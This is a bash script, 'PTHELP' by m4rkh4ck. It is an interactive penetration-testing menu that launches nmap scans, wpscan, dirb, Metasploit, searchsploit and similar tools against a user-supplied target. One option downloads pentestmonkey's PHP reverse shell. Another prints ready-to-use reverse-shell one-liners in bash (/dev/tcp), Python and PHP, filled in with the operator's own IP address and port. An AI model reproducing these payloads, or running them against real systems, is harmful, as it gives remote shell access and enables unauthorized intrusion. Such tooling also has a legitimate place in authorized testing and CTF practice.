#!/bin/bash

#Clear the page
clear

#Color variables
RED='\033[1;31m'
GREEN='\033[0;32m'
GREEN1='\033[1;32m'
WHITE='\033[1;37m'
YELLOW='\033[1;33m'
LCYAN="\e[1;36m"

#Title
echo -e "${GREEN}"
echo "██████╗ ████████╗██╗  ██╗███████╗██╗     ██████╗ ";
echo "██╔══██╗╚══██╔══╝██║  ██║██╔════╝██║     ██╔══██╗";
echo "██████╔╝   ██║   ███████║█████╗  ██║     ██████╔╝";
echo "██╔═══╝    ██║   ██╔══██║██╔══╝  ██║     ██╔═══╝ ";
echo "██║        ██║   ██║  ██║███████╗███████╗██║     ";
echo "╚═╝        ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ";
echo -e   "        ${WHITE}         by m4rkh4ck        ";
echo "                                                 ";
echo -e "${LCYAN}"
echo "############################################################"
echo "# If you spend more on coffee than on information security,#
# you will be hacked.                                      #
# What’s more, you deserve to be hacked.                   #
# (Richard A. Clarke, White House Cybersecurity Advisor)   #"
echo "############################################################"
echo -e "${RED}"
echo "DO NOT USE THIS TOOL FOR UNETHICAL PURPOSES!!!"
echo ""

#Script begin
echo -e "${WHITE}"
echo -n "Please type the ip address or the url of the target: "
read url

echo -e "${WHITE}"
PS3='Choose what to do ---> '
options=("SPAWN NEW TERMINAL" "OPENVPN" "KILLVPN" "NET INTERFACES" "OPEN IN BROWSER" "HARVESTING" "HASH IDENTIFIER" "SHELL TTY" "REVERSE_SHELL_PHP" "REVERSE SHELL CHEAT SHEETS" "INTENSE SCAN" "FAST SCAN" "CUSTOM SCAN" "WORDPRESS SCAN" "DIRB" "OPEN METASPLOIT" "OPEN WIRESHARK" "SEARCH A PUBLIC EXPLOIT" "GTFOBins" "SSH" "FTP" "Quit")

select opt in "${options[@]}"
do
    case $opt in
        "SPAWN NEW TERMINAL")
            qterminal &
            ;;
        "OPENVPN")
            echo -e "${YELLOW} Digit the name and the path of vpn file"
            read fileovpn
            openvpn $fileovpn &
            echo -e "${WHITE}"
            ;;
        "KILLVPN")
            echo -e "${YELLOW}"
            ps aux | grep openvpn
            echo "Please digit the vpn pid"
            read pid
            kill -9 $pid
            echo -e "${WHITE}"
            ;;  
        "NET INTERFACES")
            echo -e "${YELLOW}"
            ip a
            echo -e "${WHITE}"
            ;;
        "OPEN IN BROWSER")
            echo -e "${YELLOW}"
            echo "Type your low privilege user"
            read utente
            echo "Type web-port"
            read portweb
            runuser -u $utente -- firefox $url:$portweb &
            echo -e "${WHITE}"
            ;;   
        "HARVESTING")
            echo -e "${YELLOW}"
            echo "usage: theHarvester [-h] -d DOMAIN [-l LIMIT] [-S START] [-g] [-p] [-s] [--screenshot SCREENSHOT] [-v]
                    [-e DNS_SERVER] [-t DNS_TLD] [-r] [-n] [-c] [-f FILENAME] [-b SOURCE]
                    theHarvester: error: the following arguments are required: -d/--domain"
            echo ""
            echo  "Type the tag and harvest information : "
            read input
            theHarvester $input
            echo -e "${WHITE}"     
            ;;    
        "HASH IDENTIFIER")
            echo ""
            echo -e "${RED}Press ctrl +c to return in the main menu"
            echo -e "${YELLOW}"
            hash-identifier
            echo -e "${WHITE}"
            ;;
        "SHELL TTY")
            echo -e "${YELLOW}"
            echo 'python -c' 'import pty; pty.spawn("/bin/sh")'
            echo -e "${WHITE}"
            ;;       
        "REVERSE_SHELL_PHP")
            echo -e "${YELLOW}"
            wget pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
            echo -e "${WHITE}"
            ;;
        "REVERSE SHELL CHEAT SHEETS")
            echo -e "${YELLOW}"
            echo  "Type net interface that you want to use:" 
            read nic
            echo "Type your local port:"
            read localport
            echo ""
            echo "Choose your reverse: "
            echo ""
            
            #tun0
            if [[ $nic == tun0 ]]
            then
                ip a | grep tun0 | grep inet | awk '{print $2}' > .tun.tmp
                file=".tun.tmp"
            	ip=$(cat "$file")
            	address=`echo $ip | cut -d'/' -f1`
            	
            
            #eth0
            elif [[ $nic == eth0 ]]
            then
                ip a | grep eth0 | grep inet | awk '{print $2}' > .ip.tmp
            	file1=".ip.tmp"
            	ip1=$(cat "$file1")
            	address=`echo $ip1 | cut -d'/' -f1`
            	
            else
                echo "ERROR: NIC doesn't exist"
                echo -e "${WHITE}"
            fi
            
            #remove file
            if [[ $nic == tun0 ]]
            then
                rm .tun.tmp
            elif [[ $nic == eth0 ]]
            then  
                rm .ip.tmp
            else    
            echo ""
            fi
            
            #reverse
            echo -e "${RED}BASH:"
            echo -e "${LCYAN}bash -i >& /dev/tcp/${RED}$address/$localport${LCYAN} 0>&1"
            echo ""
            echo -e "${RED}PYTHON:"
            echo -e "${LCYAN}python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((${RED}\"$address\",$localport${LCYAN}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
            echo ""
            echo -e "${LCYAN}export RHOST=\"${RED}$address${LCYAN}\";export RPORT=${RED}$localport${LCYAN};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"
            echo ""
            echo -e "${RED}PHP:"
            echo -e "${LCYAN}php -r '\$sock=fsockopen(${RED}\"$address\",$localport${LCYAN});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
            echo -e "${WHITE}"
            ;;
            
          "INTENSE SCAN")
            echo -e "${YELLOW}"
            nmap -A -Pn $url
            echo -e "${WHITE}"
            ;;
         "FAST SCAN")
            echo -e "${YELLOW}"
            nmap -Pn -T4 -F $url
            echo -e "${WHITE}"
            ;;
        "CUSTOM SCAN")
            echo -e "${YELLOW} Just type the nmap tags and hit enter to start the custom scan"
            read scan
            nmap $scan $url
            echo -e "${WHITE}"
            ;;    
        "WORDPRESS SCAN")
            echo -e "${YELLOW}"
            wpscan --url http://$url
            echo -e "${WHITE}"
            ;;   
        "DIRB")
            echo -e "${YELLOW}"
            echo "Insert a port: "
            read port1
            dirb http://$url/$port1
            echo -e "${WHITE}"
             ;;
        "OPEN METASPLOIT")
             msfconsole -q
             ;;
        "OPEN WIRESHARK")
             echo "Press enter to return to the main menu"
             wireshark &
             ;;     
        "SEARCH A PUBLIC EXPLOIT")
             echo -e "${YELLOW}"
             echo "Please digit a service to exploit:"
             read cve
             searchsploit $cve
             echo -e "${WHITE}"
             ;;
        "GTFOBins")
             echo -e "${GREEN1}"
             echo "GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions"
             echo "in misconfigured systems"
             echo -e "${YELLOW}"
             echo "Type your low privilege user"
             read utente1
             runuser -u $utente1 -- firefox https://gtfobins.github.io/ &
             echo -e "${WHITE}"
             ;;

        "SSH")
             echo -e "${YELLOW}"
             echo "Please digit ssh-user"
             read user
             echo "Please digit ssh-port"
             read port
             ssh $user@$url -p $port
             echo -e "${WHITE}"
             
             ;;
        "FTP")
             echo -e "${YELLOW}"
             ftp $url
             echo -e "${YELLOW}"
             ;;             
        "Quit")
            break
            ;;
        *) echo -e "${YELLOW}INVALID OPTION --> $REPLY"
           echo -e "${WHITE}"
            ;;
    esac
    REPLY=
done
